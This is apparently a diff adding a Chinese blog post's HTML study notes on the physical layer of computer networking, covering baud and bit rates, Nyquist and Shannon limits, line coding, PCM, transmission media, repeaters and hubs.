+<p>​    并行传输：速度快，费用高，适合近距离（常用于计算机内部的数据传输）</p>
+<img src="C:/Users/86189/blog/source/_posts/17.png"  />
+
+<h4 id="2-1-3-码元、波特、速率、带宽"><a href="#2-1-3-码元、波特、速率、带宽" class="headerlink" title="2.1.3 码元、波特、速率、带宽"></a>2.1.3 码元、波特、速率、带宽</h4><h5 id="码元"><a href="#码元" class="headerlink" title="码元"></a>码元</h5><p>​    指用一个固定时长的信号波形（数字脉冲），代表不同离散值的基本波形，是数字通信中数字信号的计量单位，这个时长内的信号称为k进制码元，而该时长称为码元宽度。当码元的离散状态有M个时（M大于2），此时码元为M进制码元。</p>
+<p>​    1码元可以携带多个比特的信息量。</p>
+<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/18.png" class="">
+
+<p>K进制码元——4进制码元=&gt;码元的离散状态有4个=&gt;4中高低不同的信号波形    00、01、10、11    此时一个码元代表2比特内容</p>
+<h5 id="速率、波特、带宽"><a href="#速率、波特、带宽" class="headerlink" title="速率、波特、带宽"></a>速率、波特、带宽</h5><p><strong>速率</strong>也叫数据率，是指数据的传输速率，表示单位时间内传输的数据量。可以用<strong>码元传输速率</strong>和<strong>信息传输速率</strong>表示。</p>
+<ol>
+<li><strong>码元传输速率</strong>：别名码元速率、波形速率、调制速率、符号速率等。他表示单位时间内数字通信系统所传输的码元个数（也可称为<strong>脉冲个数</strong>或<strong>信号变化的次数</strong>），单位试试<strong>波特（Baud）</strong>。1波特表示数字通信系统每秒传输一个码元。这里的码元可以是多进制的，也可以是二进制的，但码元速率与进制数无关。</li>
+<li><strong>信息传输速率</strong>：别名信息速率、比特率等，表示单位时间内数字通信系统传输的<strong>二进制码元数</strong>（即<strong>比特数</strong>），单位是比特/秒（b/s）</li>
+</ol>
+<p>关系：</p>
+<p>​    若一个码元携带n bit的信息量，则M Baud的<strong>码元传输速率</strong>所对应的<strong>信息传输速率</strong>为M*n bit/s。</p>
+<p><strong>带宽</strong>：表示单位时间内从网络中的某一点到另一点所能通过的“<strong>最高数据率</strong>”，常用来表示网络的通信线路所能传输数据的能力。单位b/s。</p>
+<h4 id="2-1-4-奈氏准则和香农定理"><a href="#2-1-4-奈氏准则和香农定理" class="headerlink" title="2.1.4 奈氏准则和香农定理"></a>2.1.4 奈氏准则和香农定理</h4><h5 id="失真："><a href="#失真：" class="headerlink" title="失真："></a>失真：</h5><img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/19.png" class="">
+
+<p>影响失真程度的因素：</p>
+<ol>
+<li>码元传输速率</li>
+<li>信号传输距离</li>
+<li>噪声干扰</li>
+<li>传输媒体质量</li>
+</ol>
+<h5 id="失真的一种现象–码间串扰"><a href="#失真的一种现象–码间串扰" class="headerlink" title="失真的一种现象–码间串扰"></a>失真的一种现象–码间串扰</h5><img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/20.png" class="">
+
+<p>信号带宽是信道能通过的<strong>最高频率</strong>和<strong>最低频率</strong>之差</p>
+<p><strong>码间串扰</strong>：<strong>接收端</strong>收到的信号波形失去了码元之间清晰界限的现象</p>
+<h5 id="奈式准则："><a href="#奈式准则：" class="headerlink" title="奈式准则："></a><strong>奈式准则</strong>：</h5><p>​    在理想低通（无噪声，宽带受限）条件下，为了避免码间串扰，<strong>极限码元传输速率</strong>为2W Baud， W是信道带宽，单位是Hz。</p>
+<p><strong>极限数据传输率</strong> :</p>
+<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/21.png" class="">
+
+<p>​    传输速率慢：那么我们可以清晰识别每一个码元。</p>
+<p>​    传输速率快：因为码间串扰，所有不能清晰识别。</p>
+<ol>
+<li>信道的频带越宽（即通过的信号高频分量越多），就可以用更高的速率进行码元的有效传输。</li>
+<li>奈式准则给出了马原传输速率的限制，但并没有对信息传输速率给出限制。</li>
+<li>由于码元传输速率受到奈氏准则的制约，所以要提高数据的传输速率，就必须设法使每个码元都能携带更多比特的信息量，这就需要多元制的调制方法。</li>
+</ol>
+<h5 id="香农定理："><a href="#香农定理：" class="headerlink" title="香农定理："></a>香农定理：</h5><p>​    在带宽受限且有噪声的信道中，为了不产生误差，信息的数据传输速率有上限值。</p>
+<p><strong>噪声</strong>：存在于所有的电子设备和通信信道中。由于噪声<strong>随机产生</strong>，它的瞬时值有时会很大，因此噪声会使接收端对码元的判决产生错误。但是噪声的影响是相对的，若信号较强，那么噪声的影响就相对较小。因此，<strong>信噪比</strong>就很重要。</p>
+<p>信噪比=信号的平均功率/噪声的平均功率。常记作S/N，并用分贝（dB）作为度量单位，即：</p>
+<p>​    信噪比（dB）= 10log10（S/N）</p>
+<p>信道的极限数据传输速率：</p>
+<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/22.png" class="">
+
+<ol>
+<li>信道的带宽或者信道中的信噪比越大，则信息的极限传输速率越高。</li>
+<li>对一定的传输带宽和一定打的信噪比，信息传输速率的上限就确定了。</li>
+<li>只要信息的传输速率低于信道的极限传输速率，就一定能找到某种方法来实现无差错的传输。</li>
+<li>香农定理得出的为极限信息传输速率，实际信道能达到的传输速率要比它低不少。</li>
+<li>从香农定理可以看出，若信道带宽W或信噪比S/N没有上限（不可能），那么信道的极限信息传输速率也就没有上限。</li>
+</ol>
+<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/23.png" class="">
+
+<h4 id="2-1-5-编码与调制"><a href="#2-1-5-编码与调制" class="headerlink" title="2.1.5 编码与调制"></a>2.1.5 编码与调制</h4><h5 id="基带信号与宽带信号"><a href="#基带信号与宽带信号" class="headerlink" title="基带信号与宽带信号"></a>基带信号与宽带信号</h5><p>信道：信号的传输媒介。一般用来表示向某一个方向传送信息的介质，因此一条信道线路往往包含一条发送信道和一条接收信道。</p>
+<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/24.png" class="">
+
+<p>信道上传输的信号：</p>
+<ul>
+<li><p>基带信号</p>
+<p>将数字信号1和0直接用两种不同的电压表示，再送到数字信道上去传输（基带传输）。<strong>来自信源的信号</strong>，像计算机输出的代表各种文字或图像文件的数据信号都属于基带信号。基带信号就是<strong>发出了直接表达要传输的信息的信号</strong>。</p>
+</li>
+<li><p>宽带信号</p>
+<p>将基带信号进行调制后形成的频分复用模拟信号，再传送到<strong>模拟信道</strong>上去传输（宽带传输）。把基带信号经过<strong>载波调制</strong>后，把信号的频率范围搬移到较高的频段以便于再信道中传播。</p>
+</li>
+</ul>
+<p>传输距离较近时，采用基带传输方式</p>
+<p>传输距离较近时，采用宽带传输方式</p>
+<h5 id="编码与调制"><a href="#编码与调制" class="headerlink" title="编码与调制"></a>编码与调制</h5><img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/25.png" class="">
+
+<h6 id="数字数据编码为数字信号"><a href="#数字数据编码为数字信号" class="headerlink" title="数字数据编码为数字信号"></a>数字数据编码为数字信号</h6><img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/26.png" class="">
+
+<ol>
+<li><p><strong>非归零编码（NRZ）</strong></p>
+<p>高1低0：编码容易实现，但没有检错功能，且无法判断一个码元的开始和结束，以至于收发双方<strong>难以保持同步</strong></p>
+<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/27.png" class=""></li>
+<li><p><strong>曼彻斯特编码</strong></p>
+<p>将一个码元分成两个相等的间隔，前一个间隔为低电平后一个间隔为高电平表示码元1；码元0正好相反。也可以采用相反的规定。该编码的特点是在每一个码元的中间出现电平跳变，位中间的跳变<strong>即作时钟信号，又作数据信号</strong>，但它所占的频带宽度是原始基带宽度的两倍。</p>
+<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/30.png" class="">
+
+<p>​    每一个码元都被调成两个电平，数据传输速率只有<strong>调制速率</strong>（码元传输速率）的1/2。</p>
+</li>
+<li><p><strong>差分曼彻斯特编码</strong></p>
+<p>同1异0</p>
+<p>若码元为1，则前半个码元的电平与上一个码元后半个码元的电平相同。若为0，则相反。特点是：在每个码元的中间，都有一次电平的跳转，可以实现自同步，且抗干扰性强于曼彻斯特编码。</p>
+<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/31.png" class=""></li>
+<li><p>归零编码（RZ）</p>
+<p>信号电平在一个码元之内都要恢复到零的这种编码方式</p>
+<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/28.png" class=""></li>
+<li><p>反向不归零编码（NRZI）</p>
+<p>信号电平翻转表示0，信号电平不变表示1</p>
+<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/29.png" class=""></li>
+<li><p>4B/5B编码</p>
+<p>比特流中插入额外的比特以打破一连串的0或1，就是5个比特来编码4个比特的数据，之后再传给接收方，因此称为4B/5B。编码效率是80%。</p>
+<p>只采用16钟不同的4位码，其他的16种作为控制码或保留。</p>
+</li>
+</ol>
+<h6 id="数字数字调制为模拟信号"><a href="#数字数字调制为模拟信号" class="headerlink" title="数字数字调制为模拟信号"></a>数字数字调制为模拟信号</h6><p>数字数据调制技术在发送端将数字信号转换为模拟信号，而在接收端将模拟信号还原为数字信号，分别对应于调制解调器的调制和解调过程。</p>
+<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/32.png" class="">
+
+<p>调幅+调相（QAM）</p>
+<h6 id="模拟数据编码为数字信号"><a href="#模拟数据编码为数字信号" class="headerlink" title="模拟数据编码为数字信号"></a>模拟数据编码为数字信号</h6><p>计算机内部处理的是二进制数据，处理的都是数字音频，所有需要将模拟音频通过采样、量化转化成有限个数字表示的离散序列（即实现音频数字化）</p>
+<p>最典型的例子就是对音频信号进行编码的<strong>脉码调制（PCM）</strong>，在计算机应用种，能够达到最高保真水平的就是PCM编码，被广泛用于素材保存及音乐欣赏，CD、DVD以及我们常见的WAV文件中均有应用。它主要包括三步：<strong>抽样、量化、编码</strong></p>
+<ol>
+<li><p>抽样：对模拟信号周期性扫描，把时间上连续的信号变成时间上离散的信号。</p>
+<p>采样定理：<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/33.png" class=""></p>
+</li>
+<li><p>量化：把抽样取得的电平幅值按照一定的分级标度转化为对应的数字值，并取整数，这就把连续的电平幅值转化为离散的数字量。</p>
+</li>
+<li><p>编码：把量化的结果转化为与之对应的二进制编码</p>
+</li>
+</ol>
+<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/34.png" class="">
+
+<h6 id="模拟数据调制为模拟信号"><a href="#模拟数据调制为模拟信号" class="headerlink" title="模拟数据调制为模拟信号"></a>模拟数据调制为模拟信号</h6><p>为了实现传输有效性，可能需要较高的频率。这种调制方式还可以使用频分复用技术，充分利用带宽资源。在电话机和本地交换机所传输的信号是采用模拟信号传输模拟数据的方式：模拟的声音数据是加载到模拟的载波信号中传输的。</p>
+<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/35.png" class="">
+
+<h4 id="2-2-物理层传输介质"><a href="#2-2-物理层传输介质" class="headerlink" title="2.2 物理层传输介质"></a>2.2 物理层传输介质</h4><h5 id="传输介质及分类"><a href="#传输介质及分类" class="headerlink" title="传输介质及分类"></a>传输介质及分类</h5><p>​    传输介质也称传输媒体/传输媒介，它就是数据传输系统中在发送设备和接收设备之间的<strong>物理通路</strong>。</p>
+<p>传输媒体并不是物理层：</p>
+<p>传输媒体在物理层的下面，因为物理层是体系结构的第一层，因此有时称传输媒体为0层。在传输媒体中传输的是信号，但传输媒体并不知道所传输的信号代表什么意思。但物理层规定了<strong>电气特性</strong>，因此能够识别所传送的比特流。</p>
+<p>传输介质：</p>
+<ul>
+<li>导向性传输介质-&gt;电磁波被导向固体媒介（铜线/光纤）传播。</li>
+<li>非导向性传输介质-&gt;自由空间，介质可以是空气、真空、海水等。</li>
+</ul>
+<h5 id="导向性传输介质–1-双绞线"><a href="#导向性传输介质–1-双绞线" class="headerlink" title="导向性传输介质–1.双绞线"></a>导向性传输介质–1.双绞线</h5><p>双绞线是古老、又最常用的传输介质，它由<strong>两根</strong>采用一定规则<strong>并排绞合</strong>的、<strong>相互绝缘</strong>的<strong>铜导线</strong>组成。</p>
+<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/36.png" class="">
+
+<p>绞合可以减少相邻导线的电磁干扰。</p>
+<p>为了进一波提高抗电磁干扰能力，可在双绞线的外面再加上一个由金属丝编织成的屏蔽层，这就是<strong>屏蔽双绞线（SIP）</strong>，无屏蔽层的双绞线就称为<strong>非屏蔽双绞线（UTP）</strong>。</p>
+<p>特点：</p>
+<ul>
+<li>双绞线价格便宜，是最常用的传输介质之一，在局域网和传统电话网中普遍使用。</li>
+<li>模拟传输和数字传输都可以使用双绞线，其通信距离一般为几公里到十公里。</li>
+<li>距离太远时，对于<strong>模拟传输</strong>，要用<strong>放大器</strong>放大衰减的信号；对于<strong>数字传输</strong>，要用<strong>中继器</strong>将失真的信号整形。</li>
+</ul>
+<h5 id="导向性传输介质–2-同轴电缆"><a href="#导向性传输介质–2-同轴电缆" class="headerlink" title="导向性传输介质–2.同轴电缆"></a>导向性传输介质–2.同轴电缆</h5><p>同轴电缆由导体<strong>铜质芯线</strong>、<strong>绝缘层</strong>、<strong>网状编织屏蔽层</strong>和<strong>塑料外层</strong>构成。按特性阻抗数值的不同，通常将同轴电缆分为两类；50Ω同轴电缆和75Ω同轴电缆。其中，50Ω同轴电缆主要用于传送基带数字信号，又称为<strong>基带同轴电缆</strong>，它在局域网中得到广泛应用；75Ω同轴电缆主要用于传送宽带信号，又称为<strong>宽带同轴电缆</strong>，它主要用于有线电视系统。</p>
+<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/37.png" class="">
+
+<p>由于外导体屏蔽层的作用，同轴电缆<strong>抗干扰特性</strong>比双绞线好，被广泛用于传输较高速率的数据，其传输距离更远，但价格比双绞线贵。</p>
+<h5 id="导向性传输介质–3-光纤"><a href="#导向性传输介质–3-光纤" class="headerlink" title="导向性传输介质–3.光纤"></a>导向性传输介质–3.光纤</h5><p>光纤通信就是利用光导纤维（简称光纤）传递<strong>光脉冲</strong>来进行通信。有光脉冲为1，无光脉冲为0.而可见光的频率大约为<strong>10的8次方MHz</strong>，因此光纤通信系统的<strong>带宽远远大于</strong>目前其他各种传输媒体的带宽。</p>
+<p>光纤主要由<strong>纤芯</strong>（<strong>实心的！</strong>）和<strong>包层</strong>构成，光波通过纤芯进行传导，包层较纤芯有较低的折射率。当光线从高折射率的介质射向低折射率的介质时，其折射角将大于入射角。因此，当入射角够大就会出现<strong>全反射</strong>，即光线碰到包层时候就会折射回纤芯、这个过程不断重复，光也就沿着光纤传输下去。</p>
+<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/38.png" class="">
+
+<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/39.png" class="">
+
+<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/40.png" class="">
+
+<p>光缆：一根光缆少则只有一根光纤，多则包括十到数百根光纤。</p>
+<p>光纤的特点：</p>
+<ol>
+<li>传输<strong>损耗小</strong>，中继距离长，对远距离传输特别经济</li>
+<li><strong>抗雷电和电磁干扰性能好</strong></li>
+<li>无串音干扰，保密性好，也<strong>不易被窃听或截取数据</strong></li>
+<li><strong>体积小，重量轻。</strong></li>
+</ol>
+<h5 id="非导向性传输介质："><a href="#非导向性传输介质：" class="headerlink" title="非导向性传输介质："></a>非导向性传输介质：</h5><ul>
+<li><p>无线单波</p>
+<ul>
+<li>信号向所有方向传播</li>
+<li>较强的穿透能力，可远距离传输，广泛用于通信领域（手机通信）</li>
+</ul>
+</li>
+<li><p>微波</p>
+<ul>
+<li><p>信号固定方向传播</p>
+</li>
+<li><p>微波通信频率较高、频段范围宽，因此数据率很高。</p>
+<ul>
+<li><p>地面微波接力通信</p>
+</li>
+<li><p>卫星通信</p>
+<ul>
+<li>优点：</li>
+</ul>
+<ol>
+<li>通信容量大</li>
+<li>距离远</li>
+<li>覆盖范围广</li>
+<li>广播通信和多址通信</li>
+</ol>
+<ul>
+<li>缺点：</li>
+</ul>
+<ol>
+<li>传播时延长</li>
+<li>受天气影响大</li>
+<li>误码率高</li>
+<li>成本高</li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>红外线、激光</p>
+<ul>
+<li>信号固定方向传播</li>
+<li>把要传输的信号转换为各自的信号格式，即红外光信号和激光信号。再在空间中传播。</li>
+</ul>
+</li>
+</ul>
+<h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/41.png" class="">
+
+<h4 id="2-3-物理层设备"><a href="#2-3-物理层设备" class="headerlink" title="2.3 物理层设备"></a>2.3 物理层设备</h4><h4 id="中继器"><a href="#中继器" class="headerlink" title="中继器"></a>中继器</h4><p><strong>诞生原因：</strong>由于存在损耗，在线路上传输的信号功率会逐渐衰减，衰减到一定程度将造成信号失真，因此会导致接收错误。</p>
+<p><strong>中继器功能：</strong>对信号进行再生和还原，对衰减的信号进行放大，保持与原数据相同，以增加信号传输的距离，延长网络的长度。（再生数字信号）</p>
+<p><strong>中继器的两端：</strong></p>
+<ol>
+<li>两端的网络部分是网段，而不是子网，适用于完全相同的两类网络的互连，且两个网段速率要相同。</li>
+<li>中继器只将任何电缆段上的数据发送到另一段电缆上，它仅作用于信号的电气部分，并不管数据中是否有错误数据或不适用于网段的数据</li>
+<li>两端可连相同媒体，也可连不同媒体</li>
+<li>中继器两端的网段一定要是同一个协议（不会存储转发）</li>
+</ol>
+<p><strong>5-4-3规则：</strong></p>
+<p>网络标准中都对信号的延迟范围作了具体的规定，因而中继器只能在规定的范围内进行，否则会网络故障。</p>
+<p>5个网段，4个物理层网络设备，只有三个网段可以连接计算机。</p>
+<h4 id="集线器（多口中继器）"><a href="#集线器（多口中继器）" class="headerlink" title="集线器（多口中继器）"></a>集线器（多口中继器）</h4><p><strong>功能</strong>：对信号进行<strong>放大转发</strong>，对衰减的信号进行放大，接着转发到其他所有（除输入端口外）处于工作状态的端口上，以增加信号传输的距离，延长网络的长度。不具备信号的定向传送能力，是一个共享式设备。</p>
+<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/42.png" class="">
+
+<p>集线器不能分割冲突域</p>
+<p>连在集线器上的工作主机平分带宽。</p>
 ]]></content>
       <categories>
         <category>计算机网络</category>
